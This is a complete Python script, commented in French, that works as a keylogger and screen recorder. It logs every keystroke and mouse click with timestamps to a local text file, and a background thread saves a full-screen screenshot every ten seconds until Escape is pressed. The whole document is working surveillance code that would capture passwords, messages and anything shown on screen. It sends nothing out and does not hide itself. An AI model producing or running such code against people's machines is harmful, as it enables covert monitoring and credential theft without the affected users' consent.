# import pynput

# from pynput.keyboard import Key, Listener

import os
import time
from datetime import datetime
from threading import Thread
from pynput import keyboard, mouse
from PIL import ImageGrab

log_file = "log.txt"
screenshot_folder = "screen_pc"

# Créer le dossier pour les captures s’il n’existe pas
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Fonction pour écrire dans le fichier avec timestamp et type
def log_event(event_type, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] [{event_type}] {message}\n")

# --------- Clavier ---------
def on_key_press(key):
    try:
        log_event("KEY", f"{key.char}")
    except AttributeError:
        log_event("KEY", f"{key}")

def on_key_release(key):
    if key == keyboard.Key.esc:
        log_event("INFO", "Arrêt via Échap")
        return False

# --------- Souris (clics uniquement) ---------
def on_mouse_click(x, y, button, pressed):
    if pressed:
        log_event("MOUSE_CLICK", f"{button} pressé à ({x},{y})")

# --------- Capture d'écran ---------
def screenshot_loop(interval=10):
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"screenshot_{timestamp}.png"
        path = os.path.join(screenshot_folder, filename)
        ImageGrab.grab().save(path)
        log_event("SCREENSHOT", f"{filename} sauvegardé dans {screenshot_folder}")
        time.sleep(interval)

# --------- Exécution en parallèle ---------
if __name__ == "__main__":
    # Thread pour captures d'écran
    screenshot_thread = Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    # Listeners clavier et clics souris uniquement
    with mouse.Listener(on_click=on_mouse_click) as mouse_listener, \
         keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as keyboard_listener:
        mouse_listener.join()
        keyboard_listener.join()